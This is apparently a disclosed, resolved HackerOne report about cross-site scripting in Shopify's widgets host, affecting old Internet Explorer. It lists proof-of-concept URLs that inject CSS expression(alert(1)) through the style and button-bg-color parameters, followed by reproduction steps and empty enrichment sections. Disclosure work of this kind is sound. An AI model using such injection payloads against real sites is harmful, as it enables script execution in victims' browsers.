---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '105659'
original_report_id: '105659'
title: many xss in widgets.shopifyapps.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2015-12-16T20:22:24.805Z'
disclosed_at: '2016-02-04T10:15:13.531Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# many xss in widgets.shopifyapps.com

## Metadata

- HackerOne Report ID: 105659
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2016-02-04T10:15:13.531Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

xss does work only for internet explorer browser version <=10 (or in compatible mode)

xss in https://widgets.shopifyapps.com/products/...?style=[xss]&button-bg-color=[xss]
is affected parameters style and button-bg-color (maybe to include expression in style of page)

example of xss for ie(i have test ie8 , windows os) : 

https://widgets.shopifyapps.com/products/the-inbreds-winning-hearts?shop=zunior.myshopify.com&style=artgallery&image-size=compact&button-bg-color=expression(alert(1))

https://widgets.shopifyapps.com/products/buldre-bursdag-ekstra-personer?shop=klatrefabrikken.myshopify.com&style=artgallery&button-bg-color=expression(alert(1))

https://widgets.shopifyapps.com/products/c-of-change?shop=rox-spa-md.myshopify.com&style=h%20.product-buy-button{x:expression(alert(1))}

how to reproduce:
1. to use ie with version <=10
2. go to the page (look at up)
3. will be alert box with 1

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
